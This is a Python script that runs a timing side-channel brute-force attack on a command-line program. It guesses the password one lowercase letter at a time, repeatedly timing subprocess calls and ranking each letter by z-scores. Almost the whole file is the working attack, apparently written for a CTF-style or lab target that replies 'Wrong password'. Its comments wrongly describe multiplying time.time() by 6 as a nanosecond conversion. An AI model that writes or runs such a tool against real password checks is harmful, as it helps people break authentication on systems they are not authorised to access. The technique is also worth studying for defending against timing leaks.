import scipy.stats as stats
import subprocess
import time
import argparse

def guess_decorator(output):
	if output == True:
		#make guess no timer with stdout captured
		def guess(char, target):
			return subprocess.run([target, char],capture_output=True).stdout.decode('UTF-8')
		return guess
	else:
		#make guess with timer
		def guess(char, target):
			#convert to nanoseconds
			start = time.time() * 6
			#make guess
			subprocess.check_call([target, char], stdout=subprocess.DEVNULL)
			#convert to nanoseconds
			end = time.time() * 6
			duration = end - start
			return duration
		return guess

def determine_correct_guess(guess_string, target):
	iteration = 0
	#dictionary will key a lowercase letter to the amount of times that letter's zscore is greater than 0
	dict_zscores_count = {'a':0,'b':0,'c':0,'d':0,'e':0,'f':0,'g':0,'h':0,'i':0,'j':0,'k':0,'l':0,'m':0,'n':0,'o':0,'p':0,'q':0,'r':0,'s':0,'t':0,'u':0,'v':0,'w':0,'x':0,'y':0,'z':0}
	#variable to hold the current greatest score count from the dictionary with score counts to ultimately determine the letter with the highest count
	greatest_score_count = 0
	char_with_greatest_score_count= ''
	#loop will calculate zscores for every lowercase letter in alphabet 100 times to determine a winner
	while iteration < 100:
		dict_guess_zscores = {'a':0,'b':0,'c':0,'d':0,'e':0,'f':0,'g':0,'h':0,'i':0,'j':0,'k':0,'l':0,'m':0,'n':0,'o':0,'p':0,'q':0,'r':0,'s':0,'t':0,'u':0,'v':0,'w':0,'x':0,'y':0,'z':0}
		list_guess_times = []
		#loop will make a guess with every letter and append the time to make the guess to a list
		for char in dict_guess_zscores.keys():
			guess = guess_decorator(False)
			list_guess_times.append(guess(guess_string + char, target))
		#calculate z scores inputting list of times
		zscores = stats.zscore(list_guess_times)
		#loop will update zscores in dictionary with zscores keyed to characters (dict_guess_zscores) and update dictionary with counts of how many times a letter had a zscore greater than zero keyed to the letter (dict_zscores_count)
		for i, char in enumerate(dict_guess_zscores.keys()):
			dict_guess_zscores[char] = zscores[i]
			if dict_guess_zscores[char] > 0:
				dict_zscores_count[char]+=1
		iteration+=1
	#loop will find the winning letter with highest count of zscores greater than 0
	for char, value in dict_zscores_count.items():
		if value > greatest_score_count:
			greatest_score_count = value
			char_with_greatest_score_count = char
	return char_with_greatest_score_count

def main():
	parser = argparse.ArgumentParser(description='Perform a time based brute force attack against a command line program expecting a password as a single argument.')
	parser.add_argument('filepath',type=str,help='An absolute filepath to the target command line program')
	args = parser.parse_args()
	final_guess = ''
	guess = guess_decorator(True)
	while guess(final_guess, args.filepath) == 'Wrong password\n':
		print('Correctly guessed characters so far is ' + final_guess)
		print()
		next_character = determine_correct_guess(final_guess, args.filepath)
		final_guess+=next_character
	print('The correct password is \u001b[32m' + final_guess)

if __name__ == '__main__':
		main()